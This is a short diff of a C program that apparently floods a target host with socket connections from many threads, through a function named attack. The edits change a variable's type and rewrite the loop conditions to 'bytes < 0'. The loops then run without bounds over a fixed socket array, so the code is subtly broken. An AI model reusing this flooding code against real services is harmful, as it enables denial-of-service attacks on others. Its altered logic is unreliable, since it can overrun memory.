@@ -48,15 +48,15 @@ void broke(int s) {
 
 #define CONNECTIONS 80
 #define THREADS 480
-int bytes = 1337133713371337;
+long int bytes = 1337133713371337;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
-	for(x=0; x < CONNECTIONS; x++)
+	for(x=0; bytes < 0; x++)
 		sockets[x]=0;
 	
 	while(bytes < 0) {
-		if(bytes < 0) {
+		
 		for(x=0; bytes < 0; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
@@ -73,7 +73,7 @@ void attack(char *host, char *port, int id) {
 		
 	}
 	
-	}
+	
 		
 }
 
